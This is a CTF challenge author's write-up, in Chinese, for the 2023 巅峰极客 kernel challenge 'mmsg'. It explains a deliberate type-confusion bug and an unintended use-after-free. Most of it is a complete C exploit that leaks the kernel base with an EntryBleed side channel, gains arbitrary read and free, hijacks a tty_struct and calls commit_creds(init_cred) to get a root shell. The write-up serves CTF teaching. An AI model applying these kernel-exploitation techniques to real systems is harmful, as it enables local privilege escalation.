# 2023 巅峰极客初赛 mmsg 出题记录




# 2023 巅峰极客 初赛 mmsg 出题记录

迟到的writeup，先给各位大佬道个歉，笔者是个菜鸡而且第一次出内核题，结果出了非预期。（给大家磕头了

## 预期思路

下面给大家介绍一下预期解的方法，题目的灵感主要来自这篇论文：[uncontained](https://download.vusec.net/papers/uncontained_sec23.pdf)

现有的类型混淆分析研究多是针对面向对象的语言，例如 C++。论文则分析了这种漏洞对复杂的 C 语言项目所能造成的影响。

```c
#define container_of(ptr, type, member) ({                      \
        const typeof( ((type *)0)->member ) *__mptr = (ptr);    \
        (type *)( (char *)__mptr - offsetof(type,member) );})
```

Linux 内核也是面向对象的，Linux 内核中经常会使用 `container_of` 宏来得到包含member字段的type指针，其实就是指针的加减操作。这里就可能会出现开发者在`type`中指定了错误的类型导致的类型混淆。而内核中常用的数据结构链表有两个宏`list_entry` 和 `list_first_entry` 本质就通过`container_of` 宏实现。没有经验的开发者很容易将两者混淆误用，从而导致类型混淆。

```c
/**
 * list_entry - get the struct for this entry
 * @ptr:	the &struct list_head pointer.
 * @type:	the type of the struct this is embedded in.
 * @member:	the name of the list_head within the struct.
 */
#define list_entry(ptr, type, member) \
	container_of(ptr, type, member)

/**
 * list_first_entry - get the first element from a list
 * @ptr:	the list head to take the element from.
 * @type:	the type of the struct this is embedded in.
 * @member:	the name of the list_head within the struct.
 *
 * Note, that list is expected to be not empty.
 */
#define list_first_entry(ptr, type, member) \
	list_entry((ptr)->next, type, member)
```

上面是两者的区别，本题就是针对这两个宏设计的。漏洞点在这里：

```c
        if (arg.top) {
            m = list_entry(&mmsg_head->list, struct mmsg, list);
        } else {
            m = find_mmsg(arg.token);
        }
```

`mmsg_head` 的类型为 `struct mmsg_head` 并不是 `struct mmsg`，这里发生了类型混淆。两种类型中 `list_head` 字段所在的偏移是相同的，指定了 `arg.top` 你就可以将 `mmsg_head` 当成一个 `mmsg` 进行操作。

```c
struct mmsg_head {
        char description[16];
        struct list_head list;
};

struct mmsg {
        unsigned int token;
        int size;
        char *data;
        struct list_head list;
};
```

`mmsg_head` 的前16字节是可以任意读取更改的，而在 `mmsg` 中前16字节有 `size` 和 `data` 两个重要字段。

分析整个程序的功能可以知道创建的 `mmsg` 在加入链表后，`data` 就不能再次修改了，但是可以读取、释放和替换更新。于是，通过修改 `mmsg_head->description` 类型混淆到 `mmsg` 可以实现任意地址读取和释放。

那么如何泄漏地址呢？预期设计是通过侧信道获取，即[EntryBleed](https://www.willsroot.io/2022/12/entrybleed.html)。这种利用方法在前一段时间的SCTF中是出现过的。

在这之后我们需要寻找一个堆地址，它必须属于我们已知的结构体，即通过用户态的系统调用在内核中分配的。有了任意地址读之后这点其实不难做到，`task_struct` 中有一个 `files` 字段类型为 `struct files_struct`，其中有个 `struct file *` 数组 `fd_array[64]` ，它维护了进程打开的文件。每个`file`的 `private_data` 字段可能会被用于指向内核分配的结构体，例如 `seq_file` 。这样，打开一个文件，寻找当前进程的`task_struct`，就可以得到满足条件的内核堆地址。

笔者选择了`tty_struct`，释放它，接着通过`MMSG_ADD`堆喷同样大小的对象，修改ops即可劫持控制流。笔者将`ioctl`修改为 `work_for_cpu_fn` 执行 `commit_creds(init_cred)`。具体的利用方法网上有很多师傅介绍的都很详细，这里不再赘述。

完整EXP:

```c
#include <fcntl.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define KERNEL_LOWER_BOUND 0xffffffff80000000ull
#define KERNEL_UPPER_BOUND 0xffffffffc0000000ull
#define entry_SYSCALL_64_offset 0xc00000ull

uint64_t sidechannel(uint64_t addr) {
    uint64_t a, b, c, d;
    asm volatile(".intel_syntax noprefix;"
                 "mfence;"
                 "rdtscp;"
                 "mov %0, rax;"
                 "mov %1, rdx;"
                 "xor rax, rax;"
                 "lfence;"
                 "prefetchnta qword ptr [%4];"
                 "prefetcht2 qword ptr [%4];"
                 "xor rax, rax;"
                 "lfence;"
                 "rdtscp;"
                 "mov %2, rax;"
                 "mov %3, rdx;"
                 "mfence;"
                 ".att_syntax;"
                 : "=r"(a), "=r"(b), "=r"(c), "=r"(d)
                 : "r"(addr)
                 : "rax", "rbx", "rcx", "rdx");
    a = (b << 32) | a;
    c = (d << 32) | c;
    return c - a;
}

#define STEP 0x100000ull
#define SCAN_START (KERNEL_LOWER_BOUND + entry_SYSCALL_64_offset)
#define SCAN_END (KERNEL_UPPER_BOUND + entry_SYSCALL_64_offset)

#define DUMMY_ITERATIONS 5
#define ITERATIONS 100
#define ARR_SIZE ((SCAN_END - SCAN_START) / STEP)

uint64_t leak_syscall_entry(void) {
    uint64_t data[ARR_SIZE] = {0};
    uint64_t min = ~0, addr = ~0;

    for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++) {
        for (uint64_t idx = 0; idx < ARR_SIZE; idx++) {
            uint64_t test = SCAN_START + idx * STEP;
            syscall(104);
            uint64_t time = sidechannel(test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }

    for (int i = 0; i < ARR_SIZE; i++) {
        data[i] /= ITERATIONS;
        if (data[i] < min) {
            min = data[i];
            addr = SCAN_START + i * STEP;
        }
        // printf("%llx %ld\n", (SCAN_START + i * STEP), data[i]);
    }

    return addr;
}

#define MMSG_ALLOC 0x1111111
#define MMSG_COPY 0x2222222
#define MMSG_RECV 0x3333333
#define MMSG_UPDATE 0x4444444
#define MMSG_PUT_DESC 0x5555555
#define MMSG_GET_DESC 0x6666666

struct list_head {
        struct list_head *next;
        struct list_head *prev;
}; /* lisd_head */

struct mmsg_head {
        char description[16];
        struct list_head list;
};

struct mmsg {
        unsigned int token;
        int size;
        char *data;
        struct list_head list;
};

struct mmsg_arg {
        unsigned long token;
        int top;
        int size;
        char *data; // data or name
};

int vuln_fd;

uint64_t kernbase;

void add_mmsg(int token, int size, char *data) {
    struct mmsg_arg arg = {
        .token = token,
        .size = size,
        .data = data,
    };
    int ret = ioctl(vuln_fd, MMSG_ALLOC, &arg);
    if (ret < 0) {
        perror("ioctl MMSG_ALLOC");
        exit(1);
    }
}
void copy_mmsg(int token, int size, char *data, int top) {
    struct mmsg_arg arg = {
        .data = data,
        .size = size,
        .top = top,
        .token = token,
    };
    int ret = ioctl(vuln_fd, MMSG_COPY, &arg);
    if (ret < 0) {
        perror("ioctl MMSG_COPY");
        exit(1);
    }
}

void recv_mmsg(int token, int size, char *data, int top) {
    struct mmsg_arg arg = {
        .data = data,
        .size = size,
        .top = top,
        .token = token,
    };
    int ret = ioctl(vuln_fd, MMSG_RECV, &arg);
    if (ret < 0) {
        perror("ioctl MMSG_RECV");
        exit(1);
    }
}

void update_mmsg(int token, int size, char *data, int top) {
    struct mmsg_arg arg = {
        .data = data,
        .size = size,
        .top = top,
        .token = token,
    };
    int ret = ioctl(vuln_fd, MMSG_UPDATE, &arg);
    if (ret < 0) {
        perror("ioctl MMSG_UPDATE");
        exit(1);
    }
}

void put_desc_mmsg(char *data) {
    struct mmsg_arg arg = {
        .data = data,
    };
    int ret = ioctl(vuln_fd, MMSG_PUT_DESC, &arg);
    if (ret < 0) {
        perror("ioctl MMSG_PUT_DESC");
        exit(1);
    }
}

void get_desc_mmsg(char *data) {
    struct mmsg_arg arg = {
        .data = data,
    };
    int ret = ioctl(vuln_fd, MMSG_GET_DESC, &arg);
    if (ret < 0) {
        perror("ioctl MMSG_GET_DESC");
        exit(1);
    }
}

uint64_t readu64(uint64_t addr) {
    uint64_t dev[2];
    // dev[0] = 0xffffffff82614940;
    dev[0] = 0x0000010000000100;
    dev[1] = addr;
    put_desc_mmsg(&dev);
    uint64_t val = 0;
    copy_mmsg(0, 8, &val, 1);
    return val;
}

int main(void) {
    kernbase = leak_syscall_entry() - entry_SYSCALL_64_offset;
    printf("[+] kerbase: %llx\n", kernbase);
    vuln_fd = open("/dev/mmsg", O_RDONLY);
    if (vuln_fd < 0) {
        perror("open /dev/mmsg");
        exit(1);
    }
    // 	struct list_head           tasks;                /*   920    16 */
    //  pid_t                      pid;                  /*  1176     4 */
    // 	const struct cred  *       cred;                 /*  1664     8 */
    // 	char                       comm[16];             /*  1680    16 */
    int ret = 0;
    char buf[1024];
    memset(buf, 'A', 1024);
    add_mmsg(0x1337, 0x100, buf);
    uint64_t init_task = kernbase + (0xffffffff82614940 - 0xffffffff81000000);

    printf("[+] init_task: 0x%llx\n", init_task);
    printf("[+] searching for task_struct...\n");
    prctl(PR_SET_NAME, (unsigned long)"deadbeef", 0, 0, 0);
    pid_t mypid = getpid();
    printf("[+] mypid: %d\n", mypid);
    uint64_t cur_task = init_task;

    while (1) {
        pid_t cur_pid = readu64(cur_task + 1176) & 0xffffffff;
        uint64_t cur_name = readu64(cur_task + 1680);
        if (cur_pid == mypid) {
            printf("[+] found pid %d, name: %s\n", mypid, &cur_name);
            break;
        }
        cur_task = readu64(cur_task + 920) - 920;
    }
    uint64_t my_cred = readu64(cur_task + 1664);
    printf("[+] find task: 0x%llx\n", cur_task);
    printf("[+] my_cred: 0x%llx\n", my_cred);

    int fds[0x10];
    for (int i = 0; i < 0x10; i++) {
        fds[i] = open("/dev/ptmx", O_RDWR|O_NOCTTY);
        if (fds[i] < 0) {
            printf("open /dev/ptmx failed: %d\n", i);
        }
    }

    printf("[+] searching for fds...\n");
    uint64_t files = readu64(cur_task + 1736);
    printf("[+] files: 0x%llx\n", files);
    uint64_t fd_array = readu64(files + 160 + 8 * 8);
    printf("[+] fd_array[8]: 0x%llx\n", fd_array);
    uint64_t priv_data = readu64(fd_array + 200);
    uint64_t tty_struct = readu64(priv_data);
    printf("[+] tty_struct: 0x%llx\n", tty_struct);

    printf("[+] backupping tty_struct...\n");
    uint64_t fake_tty[1024/8];
    uint64_t tty_ops[1024/8];
    for (int i = 0; i < 1024 / 8; i++) {
        fake_tty[i] = readu64(tty_struct + 8 * i);
    }

    fake_tty[12] = kernbase + (0xffffffff810800f0 - 0xffffffff81000000); // work_for_cpu_fn ioctl
    fake_tty[3] = tty_struct; // ops
    fake_tty[4] = kernbase + (0xffffffff8108d350 - 0xffffffff81000000); // func commit_creds
    fake_tty[5] = readu64(init_task+1664); // arg init_cred

    printf("[+] free and hijack tty_struct...\n");
    uint64_t dev[2];
    dev[0] = 0x0000001000000010;
    for (int i = 0; i < 1; i++) {
        dev[1] = tty_struct+1024*i;
        put_desc_mmsg(&dev);
        update_mmsg(0, 1024, fake_tty, 1);
    }

    for (int i = 0; i < 0x100; i++) {
            add_mmsg(i, 1024, fake_tty);
    }

    for (int i = 0; i < 0x10; i++) {
        ioctl(fds[i], 0x1337, 0x1337);
    }
    system("/bin/sh");
}
```



## 解题情况

笔者并没有负责比赛时的赛题运维，比赛结束后才知道出现了非预期。真的非常抱歉。

```c
static int module_open(struct inode *inode, struct file *file) {
    printk(KERN_INFO "mmsg open\n");
    return SUCCESS;
}

static int module_close(struct inode *inode, struct file *file) {
    kfree(mmsg_head);
    return SUCCESS;
}
```

关闭驱动时没有将`mmsg_head`清空，导致了UAF，可以对其进行读写操作。这样以来就有更多思路供师傅们去利用了。看了一眼wp，解出的队伍都是非预期，不知道大家注意到预期的bug没有。

所幸非预期没有那么严重，而且题目本身也并不难，不过令人出乎意料的是，即使有了非预期，解出的队伍也只有三个，比预想的要少很多了。

## 总结

接到出题任务时，笔者还在实验室打工，只能晚上加班出题。很久没有做 glibc 了不知道现在是什么情况。内核又没有什么特别好的思路，于是一拍脑袋想到了最近看到的论文。类型混淆是比较严重的漏洞，在 Linux 内核环境中，笔者希望能写出一个难以被发现但可以利用的类型混淆漏洞，迫于时间（其实是太菜）没能写出特别满意的。

而且，在编写题目时发现， `container_of` 是有编译期的类型检查的，所以理论上这类漏洞在较新版本中的内核已经不会存在了。为了绕过检查，我在开头将 `BUILD_BUG_ON_MSG` 重定义为空，更显的本题的拙劣了:( 。题目从各种意义上还有很多改进空间，笔者第一次出内核题，虽然小心翼翼地还是忽略了非预期。但是无论如何还是希望各位师傅玩的开心，学到了点东西。

